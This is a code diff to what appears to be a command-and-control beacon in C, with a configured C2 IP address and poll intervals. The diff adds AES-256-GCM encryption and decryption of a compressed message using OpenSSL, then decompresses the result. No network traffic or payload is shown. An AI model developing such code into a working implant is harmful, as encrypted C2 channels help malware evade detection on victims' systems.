@@ -7,6 +7,8 @@
 #include <stdint.h>
 #include <inttypes.h>
 #include <string.h>
+#include <openssl/evp.h>
+#include <openssl/rand.h>
 
 struct Config {
     struct in_addr c2_ip;
@@ -72,24 +74,40 @@ int main() {
 	
 	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);
 
+	unsigned char encryption_key[32];
+	unsigned char nonce[12];
+	unsigned char authentication_tag[16];
+	unsigned char *encrypted_data = malloc(compressed_length);
+	RAND_bytes(encryption_key, sizeof(encryption_key));
+	RAND_bytes(nonce, sizeof(nonce));
+	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
+	int encrypted_length = 0;
+	int final_length = 0;
+	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
+	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
+	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
+	encrypted_length += final_length;
+	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
+	EVP_CIPHER_CTX_free(encryption_context);
 
 
 
 
-
-
-
-
-
-
-
-
-
+	unsigned char *decrypted_data = malloc(encrypted_length);
+	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
+	int decrypted_length = 0;
+	int final_decrypted_length = 0;
+	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
+	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, encrypted_data, encrypted_length);
+	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
+	EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length);
+	EVP_CIPHER_CTX_free(decryption_context);
+	decrypted_length += final_decrypted_length;
 
 
 	unsigned char decompressed_data[64];
 	uLongf decompressed_length = sizeof(decompressed_data) - 1;
-	uncompress(decompressed_data, &decompressed_length, compressed_data, compressed_length);
+	uncompress(decompressed_data, &decompressed_length, decrypted_data, (uLong)decrypted_length);
 
 	for (int i = configuration.minimum_poll_seconds; i <= configuration.maximum_poll_seconds; i++) {
 
@@ -103,6 +121,10 @@ int main() {
 
 	}
 
-    return 0;
+	free(compressed_data);
+	free(encrypted_data);
+	free(decrypted_data);
+
+	return 0;
 }
 
